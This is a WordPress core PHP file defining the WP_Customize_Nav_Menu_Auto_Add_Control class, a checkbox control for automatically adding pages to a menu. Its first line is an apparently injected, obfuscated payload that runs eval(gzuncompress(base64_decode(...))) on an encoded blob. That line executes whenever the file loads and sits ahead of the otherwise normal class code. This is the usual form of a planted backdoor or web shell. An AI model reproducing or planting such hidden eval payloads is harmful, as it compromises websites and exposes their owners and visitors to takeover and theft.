<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Customize API: WP_Customize_Nav_Menu_Auto_Add_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.4.0
 */

/**
 * Customize control to represent the auto_add field for a given menu.
 *
 * @since 4.3.0
 *
 * @see WP_Customize_Control
 */
class WP_Customize_Nav_Menu_Auto_Add_Control extends WP_Customize_Control {

	/**
	 * Type of control, used by JS.
	 *
	 * @since 4.3.0
	 * @var string
	 */
	public $type = 'nav_menu_auto_add';

	/**
	 * No-op since we're using JS template.
	 *
	 * @since 4.3.0
	 */
	protected function render_content() {}

	/**
	 * Render the Underscore template for this control.
	 *
	 * @since 4.3.0
	 */
	protected function content_template() {
		?>
		<# var elementId = _.uniqueId( 'customize-nav-menu-auto-add-control-' ); #>
		<span class="customize-control-title"><?php _e( 'Menu Options' ); ?></span>
		<span class="customize-inside-control-row">
			<input id="{{ elementId }}" type="checkbox" class="auto_add" />
			<label for="{{ elementId }}">
				<?php _e( 'Automatically add new top-level pages to this menu' ); ?>
			</label>
		</span>
		<?php
	}
}
